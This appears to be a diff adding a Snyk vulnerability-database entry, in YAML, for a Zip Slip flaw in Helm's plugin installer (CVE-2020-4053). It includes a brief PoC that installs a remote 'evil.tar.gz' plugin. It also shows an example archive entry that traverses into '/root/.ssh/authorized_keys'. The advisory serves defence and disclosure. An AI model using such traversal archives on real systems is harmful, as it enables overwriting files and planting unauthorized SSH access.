@@ -1,0 +1,43 @@
+---
+- id: snykio:go:github.com/helm/helm/pkg/plugin/installer:572401
+  title: Arbitrary File Write via Archive Extraction (Zip Slip)
+  description: "[github.com/helm/helm/pkg/plugin/installer][1] is a Kubernetes Package\nManager.\n\nAffected
+    versions of this package are vulnerable to Arbitrary File Write\nvia Archive Extraction
+    (Zip Slip). When installing Helm plugins from a\ntar archive over HTTP, it is
+    possible for a malicious plugin author to\ninject a relative path into a plugin
+    archive, and copy a file outside of\nthe intended directory, or overwrite contents
+    of an arbitrary file where\nthe path location is known.\n\n### PoC   {#poc}\n\n
+    \   Run helm plugin install https://github.com/snoopysecurity/Public/raw/master/payloads/evil.tar.gz`
+    \n    \n    The evil.tar.gz has a  file called “../../../../../../../../tmp/test.txt”,
+    which when extracted by the helm plugin installer will then move the test.txt
+    file to the temp directory.\n\n\n\n[1]: https://github.com/helm/helm/tree/master\n\\nIt
+    is exploited using a specially crafted zip archive, that holds path\ntraversal
+    filenames. When exploited, a filename in a malicious archive\nis concatenated
+    to the target extraction directory, which results in the\nfinal path ending up
+    outside of the target folder. For instance, a zip\nmay hold a file with a \\\"../../file.exe\\\"
+    location and thus break out of\nthe target folder. If an executable or a configuration
+    file is\noverwritten with a file containing malicious code, the problem can turn\ninto
+    an arbitrary code execution issue quite easily.\n\nThe following is an example
+    of a zip archive with one benign file and\none malicious file. Extracting the
+    malicous file will result in\ntraversing out of the target folder, ending up in
+    `/root/.ssh/`\noverwriting the `authorized_keys` file:\n\n    \n    +2018-04-15
+    22:04:29 ..... 19 19 good.txt\n    \n    +2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys\n\n"
+  affected_package: github.com/helm/helm/pkg/plugin/installer
+  vulnerable_versions:
+  - ">=3.0.0 <3.2.4"
+  severity: high
+  package_manager: go
+  cve:
+  - CVE-2020-4053
+  cwe:
+  - CWE-22
+  disclosed_date: 2020-06-16
+  created_date: 2020-06-16
+  last_modified_date: 2020-06-16
+  credit:
+  - Snyk Security Team
+  references:
+  - https://github.com/helm/helm/commit/b6bbe4f08bbb98eadd6c9cd726b08a5c639908b3
+  - https://github.com/helm/helm/pull/8317
+  - https://github.com/helm/helm/security/advisories/GHSA-qq3j-xp49-j73f
+  source_url: https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHELMHELMPKGPLUGININSTALLER-572401
